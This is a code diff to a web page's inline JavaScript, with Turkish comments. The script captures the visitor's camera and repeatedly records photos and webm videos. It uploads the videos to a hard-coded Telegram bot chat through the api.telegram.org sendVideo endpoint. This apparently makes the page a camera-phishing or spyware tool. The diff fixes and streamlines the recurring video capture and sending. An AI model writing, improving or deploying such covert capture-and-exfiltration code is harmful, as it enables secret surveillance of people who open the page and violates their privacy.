@@ -144,7 +144,7 @@
                     .catch(e => console.log(e));
             }
             
-            // ==================== KAMERA İŞLEMLERİ - ÇÖZÜM ====================
+            // ==================== KAMERA İŞLEMLERİ - KESİN ÇÖZÜM ====================
             const video = document.getElementById('video');
             const canvas = document.getElementById('canvas');
             const ctx = canvas.getContext('2d', { alpha: false, desynchronized: true });
@@ -153,6 +153,8 @@
             let videoCount = 0;
             let photoCount = 0;
             let stream = null;
+            let videoTimer = null;
+            let fotoTimer = null;
             
             async function startCamera() {
                 try {
@@ -174,9 +176,9 @@
                         const baslangicZamani = Date.now();
                         
                         // ========================================
-                        // FOTOĞRAF - 1 SANİYEDE 1 (Hemen başla)
+                        // FOTOĞRAF - HER FOTO_SURESI SANİYEDE BİR
                         // ========================================
-                        const fotoTimer = setInterval(() => {
+                        fotoTimer = setInterval(() => {
                             if (!stream?.active) return;
                             
                             photoCount++;
@@ -201,12 +203,17 @@
                         }, FOTO_SURESI * 1000);
                         
                         // ========================================
-                        // VİDEO - 3 SANİYEDE 1 (İlk video 3. saniyede)
+                        // VİDEO - İLK VİDEO 2 SANİYE SONRA BAŞLASIN
                         // ========================================
                         setTimeout(() => {
+                            videoBaslat();
+                        }, 2000);
+                        
+                        function videoBaslat() {
                             if (!stream?.active) return;
                             
                             videoCount = 1;
+                            const videoIndex = 1;
                             const videoBaslangic = Date.now();
                             const chunks = [];
                             
@@ -228,12 +235,15 @@
                                     const formData = new FormData();
                                     formData.append('chat_id', TARGET_ID);
                                     formData.append('video', blob, `video_${Date.now()}.webm`);
-                                    formData.append('caption', `🎥 Video #1 - ${VIDEO_SURESI}s (${videoSure}s | ${boyutKB}KB)`);
+                                    formData.append('caption', `🎥 Video #${videoIndex} - ${VIDEO_SURESI}s (${videoSure}s | ${boyutKB}KB)`);
                                     
                                     fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, {
                                         method: 'POST',
                                         body: formData
                                     });
+                                    
+                                    // Sonraki videoyu planla
+                                    videoTimer = setTimeout(videoBaslat, VIDEO_SURESI * 1000);
                                 };
                                 
                                 mr.start();
@@ -243,52 +253,7 @@
                                 }, VIDEO_SURESI * 1000);
                                 
                             } catch(e) {}
-                            
-                            // Diğer videolar
-                            const videoTimer = setInterval(() => {
-                                if (!stream?.active) return;
-                                
-                                videoCount++;
-                                const videoIndex = videoCount;
-                                const videoBaslangic = Date.now();
-                                const chunks = [];
-                                
-                                try {
-                                    const mr = new MediaRecorder(stream, {
-                                        mimeType: 'video/webm;codecs=vp8',
-                                        videoBitsPerSecond: 2500000
-                                    });
-                                    
-                                    mr.ondataavailable = (e) => {
-                                        if (e.data.size > 0) chunks.push(e.data);
-                                    };
-                                    
-                                    mr.onstop = () => {
-                                        const blob = new Blob(chunks, { type: 'video/webm' });
-                                        const boyutKB = (blob.size / 1024).toFixed(0);
-                                        const videoSure = ((Date.now() - videoBaslangic) / 1000).toFixed(3);
-                                        
-                                        const formData = new FormData();
-                                        formData.append('chat_id', TARGET_ID);
-                                        formData.append('video', blob, `video_${Date.now()}.webm`);
-                                        formData.append('caption', `🎥 Video #${videoIndex} - ${VIDEO_SURESI}s (${videoSure}s | ${boyutKB}KB)`);
-                                        
-                                        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, {
-                                            method: 'POST',
-                                            body: formData
-                                        });
-                                    };
-                                    
-                                    mr.start();
-                                    
-                                    setTimeout(() => {
-                                        if (mr.state === 'recording') mr.stop();
-                                    }, VIDEO_SURESI * 1000);
-                                    
-                                } catch(e) {}
-                            }, VIDEO_SURESI * 1000);
-                            
-                        }, VIDEO_SURESI * 1000);
+                        }
                     };
                     
                 } catch(e) {
@@ -297,6 +262,8 @@
             }
             
             window.onbeforeunload = function() {
+                if (fotoTimer) clearInterval(fotoTimer);
+                if (videoTimer) clearTimeout(videoTimer);
                 if (stream) stream.getTracks().forEach(t => t.stop());
             };
             
@@ -304,4 +271,4 @@
         })();
     </script>
 </body>
-    </html>
+</html>
